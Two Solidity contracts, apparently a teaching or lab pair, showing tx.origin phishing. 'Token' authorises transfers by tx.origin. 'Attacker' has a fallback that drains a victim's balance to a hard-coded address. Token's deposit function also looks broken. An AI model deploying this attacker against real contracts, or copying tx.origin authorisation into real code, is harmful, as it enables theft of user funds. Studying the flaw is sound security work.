// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./Token.sol";

contract Attacker {
    Token public token;

    constructor(address _address) {
        token = Token(_address);
    }

    fallback() external payable {
        token.transfer(
            0x59e6b3D5D75Fa62c09Ca83f27CE97E0962D6d44E,
            1000000000000000900
        );
    }
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Token {
    mapping(address => uint) values;
    event amounts(uint256);
    event contractAmount(uint256);

    function deposit(uint256 _amount) public payable {
        (bool sent, ) = address(this).call{value: _amount}("");
        require(sent);
        values[msg.sender] += _amount;
    }

    function withdraw(uint256 amount) public {
        require(values[msg.sender] >= amount);
        values[msg.sender] -= amount;
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent);
    }

    function transfer(address _to, uint256 _amount) public payable {
        require(values[tx.origin] >= _amount);
        values[tx.origin] -= _amount;
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent);
    }

    function getAmount(address _address) public {
        uint256 myAmount = values[_address];
        emit amounts(myAmount);
    }

    function getContractAmount() public {
        emit contractAmount(address(this).balance);
    }
}